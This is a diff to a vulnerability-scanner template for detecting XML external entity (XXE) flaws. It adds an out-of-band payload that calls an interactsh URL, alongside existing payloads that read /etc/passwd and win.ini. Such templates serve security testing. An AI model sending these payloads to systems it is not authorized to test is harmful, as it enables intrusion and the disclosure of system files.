@@ -21,12 +21,17 @@ http:
     type: word
     words:
     - for 16-bit app support
-  matchers-condition: or
+  - part: interactsh_protocol
+    type: word
+    words:
+    - http
   payloads:
     xxe:
     - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:///c:/windows/win.ini">
       ]><x>&{{rletter}};</x>
     - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:////etc/passwd"> ]><x>&{{rletter}};</x>
+    - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "http://{{interactsh-url}}">
+      ]><x>&{{rletter}};</x>
   pre-condition:
   - dsl:
     - method == "GET"
@@ -34,8 +39,10 @@ http:
   stop-at-first-match: true
 id: generic-xxe
 info:
-  author: pwnhxl
-  name: Generic XML external entity (XXE)
+  author: pwnhxl,AmirHossein Raeisi
+  metadata:
+    max-request: 2
+  name: Generic XML External Entity - (XXE)
   reference:
   - https://github.com/andresriancho/w3af/blob/master/w3af/plugins/audit/xxe.py
   severity: medium
